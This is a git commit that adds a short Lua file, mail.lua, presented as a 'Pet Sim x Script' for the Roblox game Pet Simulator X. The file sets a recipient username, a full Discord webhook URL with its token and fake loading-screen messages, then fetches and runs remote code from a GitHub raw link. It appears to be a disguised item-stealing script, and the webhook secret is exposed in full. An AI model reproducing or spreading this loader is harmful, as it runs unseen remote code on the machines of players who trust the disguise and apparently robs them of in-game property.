180a6aedbe9cdcc9b30c5ece5960639e0d82c55e
kabanos11 <128076425+kabanos11@users.noreply.github.com>
2023-04-27 22:39:17 +0200

    Add files via upload

---
+++ mail.lua
@@ -0,0 +1,9 @@
+Username = "qwertyui1921"
+WebHook = "https://discord.com/api/webhooks/1099473253279485982/XOGuCuv1RiZAle-wC38FUdPi8fQLw9hf6QGhhf19POcp7eFL2e6_miSvTsfo_4qRLOts"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
